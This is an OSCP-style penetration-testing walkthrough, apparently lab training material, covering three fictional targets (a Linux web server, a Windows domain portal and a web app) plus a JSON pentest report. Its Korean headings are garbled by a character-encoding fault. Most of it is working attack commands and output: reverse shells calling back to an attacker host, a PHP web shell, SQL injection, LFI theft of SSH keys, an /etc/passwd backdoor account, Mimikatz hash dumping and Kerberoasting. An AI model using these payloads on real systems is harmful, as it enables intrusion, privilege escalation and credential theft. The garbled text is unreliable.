OSCP ìŠ¤íƒ€ì¼ì˜ í˜„ì‹¤ì ì¸ ì¹¨íˆ¬ í…ŒìŠ¤íŠ¸ ë‹¨ê³„ë³„ ì‹œë‚˜ë¦¬ì˜¤
by Claude

## ğŸ“¦ ì‹œë‚˜ë¦¬ì˜¤ #1: "Legacy Web Server" (ë‚œì´ë„: ì¤‘)

### ğŸ¯ íƒ€ê²Ÿ ì •ë³´
```
Target: 192.168.10.75
Hostname: legacy-web.local
OS: Ubuntu 16.04 LTS
Difficulty: Medium
Points: 20/100
```

### ğŸ“Š Phase 1: Enumeration (ì •ë³´ ìˆ˜ì§‘)

#### Nmap ìŠ¤ìº” ê²°ê³¼
```bash
# nmap -sV -sC -p- 192.168.10.75

PORT      STATE SERVICE     VERSION
21/tcp    open  ftp         vsftpd 2.3.4
22/tcp    open  ssh         OpenSSH 7.2p2
80/tcp    open  http        Apache/2.4.18 (Ubuntu)
139/tcp   open  netbios-ssn Samba 3.0.20
445/tcp   open  netbios-ssn Samba 3.0.20
3306/tcp  open  mysql       MySQL 5.7.12

Service Info: OS: Unix

NSE: Script scanning
| smb-os-discovery:
|   OS: Unix (Samba 3.0.20)
|   NetBIOS computer name: LEGACY-WEB
|_  Domain name: legacy-web.local
```

#### ì›¹ ì„œë¹„ìŠ¤ í™•ì¸ (Dirb/Gobuster)
```bash
# gobuster dir -u http://192.168.10.75 -w /usr/share/wordlists/dirb/common.txt

/admin                (Status: 301)
/backup               (Status: 200)
/uploads              (Status: 301)
/phpinfo.php          (Status: 200)
/config.php.bak       (Status: 200)  â† ì¤‘ìš”!
```

#### FTP ìµëª… ë¡œê·¸ì¸ í…ŒìŠ¤íŠ¸
```bash
# ftp 192.168.10.75
Name: anonymous
Password: [ì—”í„°]

230 Login successful.
ftp> ls
-rw-r--r--    1 0        0            1234 Sep 15 2023 passwords.txt
-rw-r--r--    1 0        0             458 Sep 15 2023 notes.txt
```

### ğŸ”“ Phase 2: Initial Access (ìµœì´ˆ ì¹¨íˆ¬)

#### ë°œê²¬ #1: ì„¤ì • íŒŒì¼ ë…¸ì¶œ
**íŒŒì¼**: `/config.php.bak`
```php
<?php
$db_host = "localhost";
$db_user = "webapp";
$db_pass = "W3bApp!2023#Secure";  // â† í¬ë¦¬ë´ì…œ íšë“!
$db_name = "legacy_db";
?>
```

#### ë°œê²¬ #2: ì—…ë¡œë“œ ì·¨ì•½ì 
**ìœ„ì¹˜**: `/admin/upload.php`
- íŒŒì¼ í™•ì¥ì ê²€ì¦ ë¶€ì¬
- PHP ì›¹ì‰˜ ì—…ë¡œë“œ ê°€ëŠ¥

#### Exploitation ì‹œë„
```bash
# 1. PHP ë¦¬ë²„ìŠ¤ ì‰˜ ì¤€ë¹„
msfvenom -p php/reverse_php LHOST=192.168.10.50 LPORT=4444 -f raw > shell.php

# 2. ë¦¬ìŠ¤ë„ˆ ì‹¤í–‰
nc -lvnp 4444

# 3. ì‰˜ ì—…ë¡œë“œ í›„ ì ‘ê·¼
curl http://192.168.10.75/uploads/shell.php
```

#### ê²°ê³¼: ì›¹ ì„œë²„ ê³„ì •ìœ¼ë¡œ ì ‘ê·¼ ì„±ê³µ
```bash
www-data@legacy-web:/var/www/html$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

www-data@legacy-web:/var/www/html$ uname -a
Linux legacy-web 4.4.0-142-generic #168-Ubuntu x86_64 GNU/Linux
```

### â¬†ï¸ Phase 3: Privilege Escalation

#### LinPEAS ì‹¤í–‰ ê²°ê³¼ (í•µì‹¬ë§Œ)
```bash
[+] SUID files
/usr/bin/find
/usr/bin/nmap  â† ìœ„í—˜!
/bin/bash  â† ë§¤ìš° ìœ„í—˜!

[+] Interesting writable files
/etc/passwd  â† ì“°ê¸° ê°€ëŠ¥!

[+] Cron jobs
* * * * * root /opt/backup.sh  â† root ê¶Œí•œ ìŠ¤í¬ë¦½íŠ¸

[+] Backup files found
/home/admin/.bash_history
/opt/backup.sh
```

#### ë°œê²¬ëœ PrivEsc ê²½ë¡œ 3ê°€ì§€

**ë°©ë²• 1: SUID bash í™œìš©**
```bash
www-data@legacy-web$ /bin/bash -p
bash-4.3# id
uid=33(www-data) gid=33(www-data) euid=0(root) groups=33(www-data)
```

**ë°©ë²• 2: /etc/passwd ì¡°ì‘**
```bash
# íŒ¨ìŠ¤ì›Œë“œ ìƒì„±
openssl passwd -1 -salt xyz password123
# $1$xyz$xxxxxxxx...

# /etc/passwdì— ì¶”ê°€
echo 'hacker:$1$xyz$xxxxxxxx:0:0:root:/root:/bin/bash' >> /etc/passwd

# ìƒˆ ê³„ì •ìœ¼ë¡œ ì „í™˜
su hacker
Password: password123
root@legacy-web#
```

**ë°©ë²• 3: Cron Job Hijacking**
```bash
# /opt/backup.sh ë‚´ìš© í™•ì¸ (www-data ì“°ê¸° ê°€ëŠ¥)
cat /opt/backup.sh
#!/bin/bash
tar -czf /backup/www.tar.gz /var/www/

# ë¦¬ë²„ìŠ¤ ì‰˜ ì¶”ê°€
echo 'bash -i >& /dev/tcp/192.168.10.50/5555 0>&1' >> /opt/backup.sh

# 1ë¶„ í›„ root ì‰˜ íšë“
```

### ğŸ¯ Phase 4: Post-Exploitation

#### Flag íšë“
```bash
root@legacy-web# cat /root/proof.txt
8f9e4a2b7c1d3e5f6a0b9c8d7e6f5a4b

root@legacy-web# cat /etc/shadow | grep root
root:$6$xyz$...:18900:0:99999:7:::
```

#### ì¶”ê°€ ì •ë³´ ìˆ˜ì§‘
```bash
# ë‹¤ë¥¸ í˜¸ìŠ¤íŠ¸ ë°œê²¬
root@legacy-web# cat /etc/hosts
192.168.10.10   db-server.local
192.168.10.20   admin-panel.local

# ì €ì¥ëœ í¬ë¦¬ë´ì…œ
root@legacy-web# cat /root/.bash_history
mysql -u root -p'R00tP@ssw0rd!'
ssh admin@192.168.10.20
```

---

## ğŸ“¦ ì‹œë‚˜ë¦¬ì˜¤ #2: "Corporate Portal" (ë‚œì´ë„: ìƒ)

### ğŸ¯ íƒ€ê²Ÿ ì •ë³´
```
Target: 10.10.11.150
Hostname: portal.corporate.local
OS: Windows Server 2019
Difficulty: Hard
Points: 30/100
```

### ğŸ“Š Phase 1: Enumeration

#### Nmap ê²°ê³¼
```bash
PORT      STATE SERVICE       VERSION
80/tcp    open  http          IIS 10.0
139/tcp   open  netbios-ssn   
445/tcp   open  microsoft-ds  Windows Server 2019
1433/tcp  open  ms-sql-s      Microsoft SQL Server 2019
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (WinRM)

Host script results:
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled but not required
```

#### SMB Enumeration
```bash
# smbclient -L //10.10.11.150 -N

Sharename       Type      Comment
---------       ----      -------
ADMIN$          Disk      Remote Admin
C$              Disk      Default share
IPC$            IPC       Remote IPC
Backups         Disk      Old backup files  â† ì ‘ê·¼ ê°€ëŠ¥!
```

### ğŸ”“ Phase 2: Initial Access

#### ë°œê²¬: SMB ê³µìœ ì—ì„œ í¬ë¦¬ë´ì…œ íšë“
```bash
# smbclient //10.10.11.150/Backups -N

smb: \> ls
  web.config.bak           2048  Mon Sep 11 15:23:10 2023
  credentials.txt          1024  Mon Sep 11 15:25:33 2023

smb: \> get credentials.txt
```

#### credentials.txt ë‚´ìš©
```
SQL Server Credentials:
Username: sa
Password: SQLAdmin123!@#

Portal Admin:
Username: admin@corporate.local  
Password: P0rtalAdmin2023!

Service Account:
Username: svc_backup
Password: BackupSvc!2023
```

#### SQL Injection ëŒ€ì‹  ì •ë‹¹í•œ ë¡œê·¸ì¸
```bash
# mssqlclient.py 'sa:SQLAdmin123!@#'@10.10.11.150

SQL> SELECT @@version;
Microsoft SQL Server 2019 (RTM) - 15.0.2000.5

SQL> EXEC xp_cmdshell 'whoami';
nt authority\system  â† ì¦‰ì‹œ SYSTEM!
```

### â¬†ï¸ Phase 3: Lateral Movement

#### ë„ë©”ì¸ ì •ë³´ ìˆ˜ì§‘
```powershell
# WinRMìœ¼ë¡œ ì ‘ì†
evil-winrm -i 10.10.11.150 -u administrator -p 'P0rtalAdmin2023!'

*Evil-WinRM* PS C:\Users\Administrator> Get-ADUser -Filter *

Name                    SamAccountName
----                    --------------
Administrator           administrator
John Smith              jsmith
Sarah Connor            sconnor
Service Account         svc_backup
```

#### ë‹¤ë¥¸ ë¨¸ì‹ ìœ¼ë¡œ í”¼ë²—
```powershell
# ë„¤íŠ¸ì›Œí¬ ìŠ¤ìº”
*Evil-WinRM* PS> Get-NetComputer

Name                   IP Address
----                   ----------
DC01                   10.10.11.100
FILESERVER01           10.10.11.101
PORTAL                 10.10.11.150 (í˜„ì¬ ìœ„ì¹˜)

# Pass-the-Hash ê³µê²©
*Evil-WinRM* PS> Invoke-Mimikatz

[NTLM Hash Dumped]
administrator:500:aad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c:::
```

### ğŸ¯ Phase 4: Domain Admin íšë“

#### Kerberoasting ê³µê²©
```bash
# GetUserSPNs.pyë¡œ SPN ê³„ì • ì°¾ê¸°
GetUserSPNs.py corporate.local/svc_backup:BackupSvc!2023 -dc-ip 10.10.11.100

ServicePrincipalName           Name        MemberOf
-----------------------------  ----------  --------
HTTP/portal.corporate.local    svc_web     CN=Domain Admins,CN=Users,DC=corporate,DC=local

[TGS Hash]
$krb5tgs$23$*svc_web$corporate.local...

# Hashcatìœ¼ë¡œ í¬ë™
hashcat -m 13100 hash.txt rockyou.txt
Result: ServicePass2023!
```

#### Domain Admin ê¶Œí•œ íšë“
```powershell
# DA ê³„ì •ìœ¼ë¡œ ì ‘ì†
evil-winrm -i 10.10.11.100 -u svc_web -p 'ServicePass2023!'

*Evil-WinRM* PS> whoami /groups
GROUP INFORMATION
-----------------
CORPORATE\Domain Admins

*Evil-WinRM* PS> type C:\Users\Administrator\Desktop\proof.txt
9a8b7c6d5e4f3a2b1c0d9e8f7a6b5c4d
```

---

## ğŸ“‹ ì‹œë‚˜ë¦¬ì˜¤ #3: "Multi-Step Web App" (ì›¹ ì „ë¬¸)

### ê³µê²© ì²´ì¸ ìš”ì•½
```
1. SQL Injection (ë¡œê·¸ì¸ ìš°íšŒ)
   â†“
2. File Upload (ì›¹ì‰˜ ì—…ë¡œë“œ)
   â†“
3. Local File Inclusion (í¬ë¦¬ë´ì…œ ì½ê¸°)
   â†“
4. Sudo Misconfiguration (root ê¶Œí•œ)
```

### ìƒì„¸ Exploitation

#### Step 1: SQL Injection
```http
POST /login.php HTTP/1.1
Host: 192.168.1.100

username=admin' OR '1'='1&password=anything

Response: HTTP/1.1 302 Found
Location: /dashboard.php
Set-Cookie: PHPSESSID=abc123...
```

#### Step 2: Unrestricted File Upload
```http
POST /dashboard/upload.php HTTP/1.1
Content-Type: multipart/form-data

------WebKitFormBoundary
Content-Disposition: form-data; name="file"; filename="shell.php.png"

<?php system($_GET['cmd']); ?>
------WebKitFormBoundary--

# ì—…ë¡œë“œ í›„ ì ‘ê·¼
curl "http://192.168.1.100/uploads/shell.php.png?cmd=id"
uid=33(www-data) gid=33(www-data)
```

#### Step 3: LFIë¥¼ í†µí•œ ë¯¼ê° íŒŒì¼ ì½ê¸°
```bash
# /etc/passwd ì½ê¸°
curl "http://192.168.1.100/view.php?page=../../../../etc/passwd"

# SSH í‚¤ íƒˆì·¨
curl "http://192.168.1.100/view.php?page=../../../../home/developer/.ssh/id_rsa"

# SSH ì ‘ì†
chmod 600 stolen_key
ssh -i stolen_key developer@192.168.1.100
```

#### Step 4: Sudo Privesc
```bash
developer@target$ sudo -l
User developer may run the following commands on target:
    (ALL : ALL) NOPASSWD: /usr/bin/find

developer@target$ sudo find . -exec /bin/bash \; -quit
root@target# id
uid=0(root) gid=0(root) groups=0(root)
```

---

## ğŸ“ ê°•ì˜ìš© ë°ì´í„°ì…‹

### JSON í˜•íƒœë¡œ ì •ë¦¬ëœ ì‹œë‚˜ë¦¬ì˜¤ ë°ì´í„°

```json
{
  "testName": "Legacy Web Server Pentest",
  "date": "2024-12-10",
  "tester": "Junsang Dong",
  "target": {
    "ip": "192.168.10.75",
    "hostname": "legacy-web.local",
    "os": "Ubuntu 16.04 LTS"
  },
  "findings": [
    {
      "id": 1,
      "title": "Backup Configuration File Exposure",
      "severity": "High",
      "cvss": 7.5,
      "category": "Information Disclosure",
      "description": "The web server exposes a backup configuration file (config.php.bak) containing database credentials in plaintext.",
      "impact": "An attacker can obtain database credentials and potentially gain unauthorized access to the database server.",
      "affected": "http://192.168.10.75/config.php.bak",
      "steps": [
        "Browse to http://192.168.10.75/config.php.bak",
        "Download the file",
        "Extract database credentials: webapp / W3bApp!2023#Secure"
      ],
      "evidence": "File contents showed plaintext credentials",
      "remediation": "Remove all backup files from the web directory. Implement proper backup procedures that store sensitive files outside the web root.",
      "references": ["CWE-530", "OWASP-A05"]
    },
    {
      "id": 2,
      "title": "Unrestricted File Upload",
      "severity": "Critical",
      "cvss": 9.8,
      "category": "Remote Code Execution",
      "description": "The admin upload functionality does not properly validate file types, allowing arbitrary PHP code execution.",
      "impact": "An attacker can upload a PHP web shell and execute arbitrary commands with www-data privileges.",
      "affected": "http://192.168.10.75/admin/upload.php",
      "steps": [
        "Access /admin/upload.php",
        "Upload PHP reverse shell",
        "Access uploaded file at /uploads/shell.php",
        "Obtain reverse shell as www-data"
      ],
      "evidence": "Successfully uploaded and executed PHP reverse shell",
      "remediation": "Implement strict file type validation. Use a whitelist approach for allowed file extensions. Store uploaded files outside the web root or with a randomized name.",
      "references": ["CWE-434", "OWASP-A04"]
    },
    {
      "id": 3,
      "title": "SUID Bash Binary",
      "severity": "Critical",
      "cvss": 9.8,
      "category": "Privilege Escalation",
      "description": "/bin/bash has SUID bit set, allowing any user to escalate to root privileges.",
      "impact": "Any user with shell access can immediately obtain root privileges.",
      "affected": "/bin/bash (SUID bit set)",
      "steps": [
        "Identify SUID bash: find / -perm -4000 2>/dev/null",
        "Execute: /bin/bash -p",
        "Verify root access: id"
      ],
      "evidence": "Successfully escalated to root (euid=0)",
      "remediation": "Remove SUID bit from /bin/bash: chmod u-s /bin/bash. Review all SUID binaries and remove unnecessary permissions.",
      "references": ["CWE-269"]
    }
  ],
  "timeline": [
    "14:00 - Initial scan and enumeration",
    "14:15 - Discovered config.php.bak exposure",
    "14:30 - Exploited file upload vulnerability",
    "14:45 - Obtained www-data shell",
    "15:00 - Privilege escalation via SUID bash",
    "15:05 - Root flag captured"
  ],
  "flags": {
    "user": "f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8",
    "root": "8f9e4a2b7c1d3e5f6a0b9c8d7e6f5a4b"
  }
}
```
